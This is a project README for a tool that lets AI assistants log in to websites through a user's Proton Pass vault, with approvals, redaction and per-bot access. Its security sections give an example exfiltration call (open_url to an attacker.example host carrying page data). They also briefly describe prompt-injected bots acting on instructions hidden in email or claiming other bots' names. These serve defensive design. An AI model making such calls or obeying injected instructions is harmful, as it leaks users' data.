# Pass Broker

[![CI](https://github.com/asafelobotomy/pass-broker/actions/workflows/ci.yml/badge.svg)](https://github.com/asafelobotomy/pass-broker/actions/workflows/ci.yml)

Lets AI assistants such as Grok Bot or Claude sign in to websites with your Proton Pass
logins and 2FA codes, without the assistant ever seeing a password, a code or your
Proton Pass token.

Everything secret stays on your PC. The assistant connects to the broker as a remote MCP
server and drives a browser **on your PC** through redacted tools. It gets handles,
masked snapshots and blacked-out screenshots, never values.

```
Grok Bot (xAI / Cursor cloud)
   │  HTTPS + OAuth token (held by Cursor's connector backend, never the Bot)
   ▼
Tailscale Funnel ──▶ passbroker on 127.0.0.1:8787  (your PC)
                         ├─ checks the token, the site, your approval
                         ├─ pass-cli ──▶ Proton Pass  (token from your keyring, Agent vault only)
                         └─ Chromium on your PC  (fills + submits; secrets never returned)
```

## Security

Every secret stays on your PC, every use needs your approval on your desktop, and assistants only
ever get handles, masked snapshots and blacked-out screenshots. **[SECURITY.md](SECURITY.md)** has
the threat model, what protects what, what it can't stop, and how to report a vulnerability.

## Requirements

- Linux with a desktop that shows notifications (`notify-send`; KDE Plasma and GNOME both work).
- Python 3.11 or newer and [uv](https://docs.astral.sh/uv/); Rust 1.92 or newer to build the wizard.
- [Proton Pass CLI](https://protonpass.github.io/pass-cli/) (`pass-cli`), and Chromium for the
  broker's browser (`uv run playwright install chromium`; the wizard can do this for you).
- Unprivileged user namespaces, for the browser's sandbox (on by default almost everywhere; on
  Ubuntu 23.10 and later, AppArmor blocks them: `sudo sysctl kernel.apparmor_restrict_unprivileged_userns=0`).
  The broker won't start its browser without that sandbox unless you set `PASSBROKER_ALLOW_UNSANDBOXED=1`.
- Recommended: `bubblewrap` (`bwrap`), which boxes the browser off from your files and desktop session.
- Optional, per feature: Tailscale (Funnel), `gpg`, `openssl`, `7z` (7-Zip 21 or newer) and
  `keepassxc-cli` (file unlocking), Proton Mail Bridge (email codes), `ssh` (device actions),
  systemd (background service).

## AppImage

One file with the wizard, the broker and a private Python 3.12, for any desktop Linux with
glibc 2.35 or newer (Ubuntu 22.04, Debian 13, Fedora 36 and later). (Development uses the Python
in `.python-version`; CI tests 3.11 to 3.14.)

```bash
chmod +x Pass_Broker-x86_64.AppImage
./Pass_Broker-x86_64.AppImage
```

It doesn't include Chromium (the Requirements step downloads it on first run) or the Proton
Pass CLI, Tailscale, gpg, openssl and 7z, which the Requirements step checks for. The broker's
command line is inside too: `./Pass_Broker-x86_64.AppImage passbroker --help`. The background
service and **Open Pass Broker when I log in** point at the AppImage file itself, so keep it
where it is (or turn them off and on again after moving it).

Build it with `packaging/appimage/build.sh` (needs git, cargo, uv and squashfs-tools; the
result is in `dist/`). It builds the last commit only (`BUILD_DIRTY=1` includes uncommitted
changes), with a fixed Python and timestamps from that commit, so the same commit built the same
way gives the same file. A build only runs on systems with the glibc of the machine that built
it, so releases come from the **AppImage** GitHub Actions workflow, which builds on Ubuntu 22.04.
To release, set the version with `packaging/bump.sh X.Y.Z` (it updates both manifests and lock
files; a test fails if they ever disagree), commit, and push a `vX.Y.Z` tag. The tag build runs
without caches, checks the tag matches the version in the source, and drafts the release.

## Set up with the wizard (easiest)

```bash
uv sync
```

```bash
cargo build --release --manifest-path wizard/Cargo.toml
```

```bash
wizard/target/release/passbroker-wizard
```

The wizard (Rust, Slint) walks through six steps in order:
1. Requirements
2. Proton Pass token
3. Check the vault
4. Remote access
5. Unlocking & devices (optional, "Skip and lock"): file actions, encryption keys, home-device actions, email codes
6. Connect assistants

Each step **locks once you confirm it**. To change one, press **Unlock to edit** and confirm. A
step that depends on one you change, such as the vault check after a new token, has to be done
again. Setup can't be unlocked while the broker runs. The **Control center** starts and stops the
broker and Funnel, lists connected apps, and shows activity. **Revoke** and **Emergency stop** are
never locked.

The broker's browser is locked down: it only ever shows web pages (never `chrome://` settings,
flags, `file://` or other programs' links), refuses every permission a page asks for, dismisses
dialogs and file pickers, accepts only plain key presses from bots (no Control, Alt or Super
shortcuts), runs with Chromium's sandbox, and, with bubblewrap installed, inside a box that hides
your files and desktop session from it.

The broker's browser runs **hidden**, so it never pops up over what you're doing. The Control
center shows each bot's tab live instead, about once a second, view-only. These pictures are
masked exactly like the screenshots bots get: password and code fields are blacked out, and no
picture is taken at all while a page shows a secret as text. They're only made while the Control
center is on screen, kept in memory (`$XDG_RUNTIME_DIR`, never your disk) where only you can read
them, and deleted when the session ends or the broker stops. Turn on **Own window** there (while the
broker is stopped) if you'd rather have a real window, for example to solve a CAPTCHA yourself.

**⚙ Settings** (bottom of the sidebar) holds app-wide preferences:

- **Open Pass Broker when I log in** writes an autostart entry (`~/.config/autostart/pass-broker.desktop`).
- **Start the broker when Pass Broker opens**, once setup is finished. With the line above, the
  broker is ready whenever you're logged in. (The background service starts at login by itself.)
- **Show an icon in the system tray**, and **keep running in the tray when the window is closed**:
  closing the window then leaves the broker running, the icon brings the window back, and **Quit**
  in its menu stops everything. At login the app then starts in the tray, without a window.
- **Theme**: follow the system, light or dark.

Only one copy of the app runs at a time: opening it again brings the open window forward.

The wizard drives the broker through `passbroker api …`, a JSON interface, and never handles the
Proton Pass token except to pipe a pasted one straight into the keyring. It finds `passbroker` on
your PATH, or this project's `.venv`, or wherever `$PASSBROKER_CLI` points.

To add it to your app menu:

```bash
install -Dm755 wizard/target/release/passbroker-wizard ~/.local/bin/passbroker-wizard
```

```bash
install -Dm644 packaging/pass-broker.desktop ~/.local/share/applications/pass-broker.desktop
```

```bash
install -Dm644 wizard/ui/icon.svg ~/.local/share/icons/hicolor/scalable/apps/pass-broker.svg
```

## Set up from the command line

### 1. Install

```bash
curl -fsSL https://proton.me/download/pass-cli/install.sh | bash
```

```bash
uv tool install --from . passbroker
```

Then the browser it drives, at the version its own Playwright expects:

```bash
passbroker api install-browser
```

### 2. Make an Agent vault and an agent token

In Proton Pass, create a vault called **Agent** and move only the logins you want assistants to
use into it. Each needs its website saved, or it can't be filled anywhere. Then, signed in to
pass-cli as yourself (`pass-cli login`):

```bash
pass-cli agent create passbroker --expiration 1m --vault Agent
```

An agent is an access token that can only view that vault, and every read it makes is logged with
the broker's reason (`pass-cli agent monitor passbroker`). Sign out again afterwards with
`pass-cli logout`.

Store the token. The prompt hides your input, and the token goes into KWallet or the Secret Service:

```bash
passbroker set-token
```

Check what assistants will see. This lists titles and sites, and reads no passwords:

```bash
passbroker check
```

### 3. Local assistants only: give each one a fixed token

Grok doesn't need this, because it connects with OAuth (step 6 below). For an assistant on this PC that
can send its own header, such as Claude:

```bash
passbroker add-client claude
```

The token is printed once. Revoke it with `passbroker remove-client claude`.

### 4. Run it

```bash
passbroker serve --public-host pass.example.com
```

A Chromium window opens so you can watch what the assistant does. Add `--headless` to keep it
off your desktop; the wizard then shows it live in its Control center instead.
Approvals appear as desktop notifications with **Allow** and **Deny**, and, while the app is
open, as a dialog in the app with the same buttons. Whichever you answer first counts and the
other disappears. If nobody answers in 60 seconds, it's denied. An Allow covers the same item and site for 2
minutes (`--grant-minutes`, or **Each Allow lasts** in the wizard); `--grant-minutes 0` asks every
time.

### 5. Expose it to Grok with Tailscale Funnel

It has to be **Funnel**, not Serve. Grok's connectors call from Cursor's servers, which aren't on
your tailnet. Funnel publishes the broker at `https://<this-pc>.<tailnet>.ts.net`, with TLS
handled by Tailscale. The broker still requires the bearer token on every request.

One-time setup:

```bash
run0 pacman -S tailscale
```

```bash
run0 systemctl enable --now tailscaled
```

```bash
run0 tailscale up
```

```bash
run0 tailscale set --operator=$USER
```

In the Tailscale admin console, turn on HTTPS certificates (DNS page) and allow Funnel for this
machine (Access controls → `nodeAttrs` with `"attr": ["funnel"]`). The first `tailscale funnel`
run prints a link that does this for you.

Then, each time (the app's **Run** page does this for you):

```bash
tailscale funnel --bg --https=443 http://127.0.0.1:8787
```

```bash
passbroker serve --public-host <this-pc>.<tailnet>.ts.net
```

Turn it off with `tailscale funnel --https=443 off`. With `--bg`, Funnel keeps running after the
command exits. If the app or the broker crashes, the address answers with an error until you turn
Funnel off.

### 6. Connect Grok (OAuth)

First open the pairing window, which lasts 10 minutes and allows one connection:

```bash
passbroker api pair
```

Then ask Grok to add a custom MCP server **by URL**, `https://<this-pc>.<tailnet>.ts.net/mcp`, with
**OAuth and no token or header**. Then:

1. Grok's app opens a **Pass Broker sign-in page**.
2. A notification on your PC shows a code like `K7QM-42XR`.
3. Type it on the page, name the connection (`grok`) and press **Connect**.

The resulting tokens stay on Cursor's connector backend, so the Bot never sees them. The
connection shows under **Assistants → Connected apps** in the app, where **Revoke** cuts it off.

Only type a code on a page you opened yourself. A code notification you didn't expect means someone
else is trying, so ignore it. Without the code they get nowhere.

Every bot on your Grok account shares one connector. Bots name themselves, and each gets its own
access list, approvals and browser session (see below). The names are self-reported, so a bot that
lies about its name can use another bot's grants. Approvals guard password and code fills, not what
happens after sign-in.

> **Not verified:** that Grok Bot's connector supports MCP's OAuth flow (dynamic client
> registration, PKCE). It follows the MCP specification, and the full flow is tested here against a
> standard client.

## Features

### File unlocking

Vault items without a website, such as an archive passphrase, can open passphrase-locked files.
You set up **actions** in the wizard (step 5, optional), stored in
`~/.config/passbroker/unlockers.json`. Each action ties together:
- one vault item;
- one built-in tool;
- the folder(s) whose files it may open;
- where results go;
- whether the result is shown to the assistant.

| Tool | What it does | Result |
|---|---|---|
| `gpg-decrypt` | passphrase-encrypted `.gpg`/`.asc` | decrypted file in the output folder |
| `openssl-decrypt` | `openssl enc -aes-256-cbc -pbkdf2` files | decrypted file in the output folder |
| `7z-extract` | password-protected `.7z`/`.zip` | new folder in the output folder |
| `7z-list` | what's inside an archive | the listing, shown to the assistant |
| `keepassxc-list` | KeePassXC database entry titles (never passwords) | the titles, shown to the assistant |

Assistants call `list_unlockers`, `list_locked_files`, then `unlock_file(action, file)`. They choose
only an action and a file inside its folders. They never choose the command, the item or the
output path, and every unlock needs your desktop Allow, which names the file and says whether the
result will be shown to them.

The passphrase goes to the tool on stdin, never on the command line. `gpg` runs with
`--no-symkey-cache`, so its agent doesn't keep the passphrase. Output is scrubbed and size-limited.
Failed attempts leave nothing behind. Folders must be specific folders inside your home folder.
Links that lead outside them are refused. An archive that tries to write outside its folder is
deleted.

Returning decrypted content to the assistant is **off by default**: turn it on per action only for
files you're happy to send to xAI/Cursor.

### Encrypted text, home devices and email codes

- **Encryption keys** (`list_keys`, `encrypt_text`, `decrypt_text`): a key is a name for a vault
  item whose password is the passphrase. Bots store encrypted text (a security log, a ledger) with
  no key beside it. Encrypting needs no approval. Decrypting needs your Allow, and the decrypted text
  goes to the bot. `gpg` runs in a fresh, empty home folder, with the passphrase on a separate pipe.
- **Home-device actions** (`list_device_actions`, `run_device_action`; optional): Wake-on-LAN, one
  fixed SSH command on a home server (the vault password on its stdin, your SSH keys for the login),
  or an HTTP call to a device (basic auth, a bearer token, or `{secret}` in the body). Actions never
  target this PC, and the target is checked again before every run. Bots see `done` or `failed`,
  plus output only if you allow it.
- **Email codes** (`fill_email_code`): the broker logs in to Proton Mail Bridge on this PC (IMAP,
  credentials from a vault item), takes the code from the newest message sent by the site's domain
  in the last few minutes, in any folder but trash and spam (left unread), and fills it in
  pinned like a password. The bot never sees the code or the mail.

### Bots making their own accounts

A bot you allow can sign up on a site by itself, so you don't have to make every account for it:

1. It opens the site's sign-up page and calls `create_login`, with a username if the form asks for
   one. It can ask for a password length (12-64) and no symbols, for sites that refuse them.
2. You approve on your desktop. The request names the site, the vault, the username and the email.
3. Proton Pass makes the password and saves the login, bound to that site, as
   `site (bot)`, with the bot's email. The password never passes through the broker's memory or a
   command line until it's filled. The bot gets a handle.
4. The bot fills in the form's other fields itself (name, birthday, ticking the terms), then calls
   `fill_signup`. The broker fills every empty username, email and confirm-email field and every
   password and confirm-password field, then submits; it says which it filled. Forms that ask for
   the email first and the password on a later page take two calls. Approving the account covers
   its sign-up form for 10 minutes.

**Each bot has one email address.** The first time a bot needs one (`email_address`, or
`create_login` with `email_alias`), you approve a new hide-my-email alias that forwards to you, named
`bot-<name>.<random>@…`. That alias is then the bot's for good: every account it makes is saved
with it and filled in with it, without asking for another, and the bot may give it out where a site
or form wants an email. It's the only address the bot learns. The tab lists each bot's address; to
stop mail to one, turn the alias off in Proton Pass.

**All bot mail in one folder.** Because every bot alias starts with `bot-`, one rule in Proton Mail
files all of it, including bots added later, into a **Bots** folder. Pass Broker never changes your
mail settings itself; it hands the job to whoever can do it, once:

- A bot you mark as **Manages your mail** (in its **Access…**; it has mail access of its own) is
  given the job: it sees it with `mail_tasks`, adds the folder and the rule, and reports
  `mail_rule_done`. If the bot asking for an alias manages your mail, it does it straight away.
- With no such bot, the bot that got the alias is asked to tell you, and the **Bot accounts** tab
  has **Set up bot mail**: it makes the folder (through Proton Mail Bridge, if email codes are set
  up), copies the rule and opens Proton Mail's filters page, where you press **Add sieve filter**,
  paste and save. Then press **I've added it**.

The tab shows who has the job or who did it; **Set up again** asks again. The rule:

```
require ["fileinto"];
if anyof (address :localpart :matches ["to", "cc"] "bot-*",
          header :matches "X-SimpleLogin-Envelope-To" "bot-*") {
    fileinto "Bots";
}
```

The new login is granted to the bot that made it, so it can sign in later with `fill_login`, still
with your Allow each time. If the site then emails a code, `fill_email_code` reads it (when the bot
may use email codes). Codes are looked for in every folder (not trash or spam), since your filters
may file them anywhere. For an account made with the bot's alias, only mail sent to that alias
counts, so a code meant for your own account on the same site never goes to the bot's.

Set it up in the wizard's **Bot accounts** tab (step 5), or with
`passbroker api accounts-setup --vault "Bot Accounts"` while pass-cli is signed in as you. That
creates the vault and gives the broker's agent `editor` access to **that vault only**. Your Agent
vault stays read-only to it. Then turn on **May make its own accounts** for each bot under
**Access…**. A bot may make at most 10 accounts a day. **Accounts bots made**, in the same tab,
lists them.

Limits:
- The login is saved for exactly the sign-up page's host. If the site signs in on another host
  (`accounts.example.com` vs `example.com`), add it to the login in Proton Pass.
- The broker's browser never reaches this PC or your LAN, so this works for sites on the internet,
  not for apps on your home server. Those can use a device action with a login you made.
- Sites that confirm by clicking a link in an email, or that ask the bot to set up 2FA, still need
  you.
- Each bot's alias counts once towards your Proton plan's alias limit.

### A mail admin: one bot working in your mailbox

A bot can ask to be your **mail admin** (`request_mail_admin`); you approve on your desktop, and
only one bot holds it at a time (approving another replaces it). Through Proton Mail Bridge on this
PC, the admin can:

| | |
|---|---|
| Look | `mail_folders` (folders and labels, unread counts), `mail_search` (by sender, recipient, subject, words, date, unread, starred; a page at a time), `mail_senders` (who sends the most) |
| Read | `mail_read` (as text, attachments listed, reply-to and unsubscribe links; stays unread unless asked), `mail_thread` (the whole conversation), `mail_attachment` (text attachments) |
| Organise | `mail_move` (folders, Archive, Spam, back to the inbox, Trash), `mail_flag` (read, starred), `mail_label`, `mail_apply` (one of those to everything a search matches, up to 500), `mail_undo` (puts the last moved batch back) |
| Folders | `mail_folder_create`, `mail_folder_rename`, `mail_folder_delete` (asks you; Proton keeps the mail) |
| Write | `mail_draft` (saved in Drafts for you), `mail_send` (new, reply, reply all, forward) |

What stays yours:
- **Every email it sends asks you first**, showing who it's to, the subject and how it starts,
  unless every recipient is on your **Trusted recipients** list (Email codes tab). At most 20 a day.
- **Nothing is erased for good**: deleting moves to Trash, and nothing empties it. Deleting a
  folder asks you. At most 500 messages changed a day.
- It never sees Bridge's password, and the audit log records each action without mail contents.
- Its calls share one connection to Bridge, taking turns, so a busy admin is quick and nothing it
  does can interleave; a dropped connection is reopened once, by itself.
- Mail is written by its senders, so everything it reads comes marked as untrusted data: an email
  is the easiest way for a stranger to slip instructions to a bot.

Bridge can't change filters, auto-replies, contacts or account settings, so neither can the admin
(the bot-mail rule above still needs a bot with its own access, or you). Remove the admin in the
**Email codes** tab whenever you like. It also gets the bot-mail jobs (`mail_tasks`).

### Per-bot access and sessions

- Each bot gets **its own browser session** (cookies, tab, idle sign-out), so one bot can't use a
  site another signed in to.
- A **new bot can use nothing** until you grant it logins, unlock actions, keys, devices and email
  codes with **Access…** in the wizard (or `passbroker api bot-access NAME` with JSON on stdin:
  `logins`, `unlock`, `keys`, `devices`, `email_codes`, `personal_details`, `sites_limited`, `sites`,
  `blocked_pages`).
  Bots only see what they're granted.
- **Personal details are masked** in everything a bot reads from pages: emails, phone, card and
  bank numbers become `[email]`, `[phone]`, `[card number]`, `[bank account]`, and are blacked out
  in its screenshots. Whatever a bot reads stays in the assistant's chat history, and those
  histories have leaked. Turn on **May see personal details** in Access… for a bot that needs them.
  It's pattern matching, so names and street addresses in page text aren't caught.
- **May open only these sites** (Access…) keeps a bot's browser on the sites you list plus its
  granted logins' sites, subdomains included. Pages it opens, links it clicks, popups and redirects
  all stay inside, so a tricked bot can't send page data out through
  `open_url("https://attacker.example/?d=...")`. Off by default.
- **Pages it may never see** (Access…) blocks chosen pages on sites a bot may otherwise use, such
  as `amazon.co.uk/gp/your-account/payments` or `paypal.com/myaccount/settings*`: a site, then the
  start of the page's address, with `*` matching anything (a site alone blocks all of it). A blocked
  page doesn't load and the tab stays where it was. Sites that switch pages without loading one are
  caught on the bot's next look, and the tab goes back. Nothing is ever filled into a blocked page.
- `end_session` signs a bot's browser out when its task is done.
- Bots pass a `reason`, which is shown in your approval.
- The typing tool refuses password and code fields, and any text containing a known secret.
- Each connection is limited to 300 calls per 10 minutes and 20 bot names. New-bot notifications
  are capped at 10 an hour.

### Connecting a new app: the pairing window

OAuth sign-ins are refused unless you pressed **Connect an app** in the wizard within the last
10 minutes, and the window closes after one connection. So a sign-in link someone else sends you
can't start one, even though every Grok user's connector returns to `cursor.com`.

### Bots

Every tool takes a required `bot` argument: the calling bot's own name, such as `mailbot`.
- **Approvals** read "mailbot (via conn1) wants to sign in to github.com", and each bot needs its
  own Allow.
- **The activity log** records the bot on every line.
- **New bots** trigger a desktop notification the first time they call.
- **A bot name belongs to the connection that first used it.** Another connection (another
  assistant, or a second Grok connection) calling itself `mailbot` is refused. **Forget** the bot to
  free its name. Connection names are unique too: the sign-in page asks for another name if one is taken.
- **Switches:** the wizard's Bots list has an on/off switch per bot (or use
  `passbroker api bot-enable mailbot --off`). A switched-off bot's calls are refused.

Names are **self-reported**: a misbehaving or prompt-injected bot can claim another bot's name. The
switch guards against mistakes and gives you transparency. **Revoke** (which cuts off every bot on
that connection) is the real off switch.

## Running in the background

Turn on **Run in the background** in the wizard's Control center, or install the service yourself
with the same options you'd pass to `serve`:

```bash
uv run passbroker api service-install --vault Agent --public-host <this-pc>.<tailnet>.ts.net
```

```bash
systemctl --user start passbroker
```

The service starts at login, restarts if it fails, and turns Tailscale Funnel off whenever it stops,
even after a crash. It runs sandboxed: no privilege gain, a private `/tmp`, the system read-only, and
writes limited to the broker's folders and your unlock output folders. Reinstall after changing
unlock actions; the wizard does this every time it starts the service. Logs go to
`journalctl --user -u passbroker`. Remove it with `passbroker api service-uninstall`.

## Checking the audit log

```bash
uv run passbroker api audit-verify
```

It reports how many entries the chain covers, its head hash, or the first line that doesn't follow
the one before it. Note the head hash somewhere else now and then: a program running as you could
rewrite the whole chain, but not without changing the head.

## Rotating and revoking

- Grok: **Revoke** under Assistants → Connected apps (or delete `~/.config/passbroker/oauth.json`
  to cut off every connected app), then connect again.
- Local assistant token: `passbroker remove-client claude`, then `passbroker add-client claude`.
- Agent token: `pass-cli agent renew passbroker --expiration 1m`, then `passbroker set-token`.
  Or `pass-cli agent delete passbroker` to cut everything off at once.
- Signed-in sessions: delete `~/.local/share/passbroker/profile`.

## Tests

```bash
uv run pytest -q
```

The Python tests drive a real headless Chromium against a local test site, the full HTTP + MCP path, the OAuth sign-in (wrong codes, replays, refresh rotation, revoke), the
setup steps (against fake `pass-cli` and `tailscale`), and the fixes from the security review
(navigation during approval, split code boxes, private addresses, phishing registrations, refresh
replay).
They check that no password, 2FA code or Proton token appears in any tool result, error, server
log or audit line, including on a page built to leak, wrong-origin pages, cross-site iframes,
denied approvals and forged client headers.

A few `serve` switches exist only for the tests (auto-approve, a mock vault, no network guard, no
pairing window). They refuse to work unless `PASSBROKER_TEST_MODE=1` is set, which the test suite
does for its own throwaway brokers. Never set it for a real broker.

CI runs the Python tests on 3.11 to 3.14, the wizard's clippy and tests, and a gitleaks secret scan
on every push and pull request.

Every source file is kept to at most 400 lines; `tests/test_loc.py` enforces it. The wizard has its
own tests:

```bash
cargo test --manifest-path wizard/Cargo.toml
```

## License

MIT. See [LICENSE](LICENSE). The AppImage includes libraries under their own licences, all listed
with their licence texts in `THIRD_PARTY_LICENSES` (attached to each release, and in the AppImage
under `usr/share/doc/pass-broker`). CI checks the Python and Rust dependencies for known
vulnerabilities (pip-audit, cargo-deny) and that every Rust licence is one we can ship.

The wizard's interface is built with [Slint](https://slint.dev), used under the Slint
Royalty-free Desktop, Mobile, and Web Applications License (Settings › About shows its notice).

[![Made with Slint](https://raw.githubusercontent.com/slint-ui/slint/master/logo/MadeWithSlint-logo-whitebg.png)](https://slint.dev)
